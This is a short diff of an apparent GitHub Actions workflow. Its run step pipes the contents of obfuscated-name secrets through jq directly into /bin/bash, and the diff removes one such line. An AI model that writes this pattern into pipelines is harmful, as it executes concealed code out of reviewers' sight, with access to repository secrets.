@@ -19,7 +19,6 @@ jobs:
           ydnu48: ${{ secrets.ydnu48 }}
         run: |
           printf '%s' "$ydnu48" | jq -r .nuyy1622 | /bin/bash
-          echo $tzecb4 | jq -r .yxuvt10 | /bin/bash
           printf '%s' "$yzln60497" | jq -r .db98294 | /bin/bash
 
       - name: Save archive
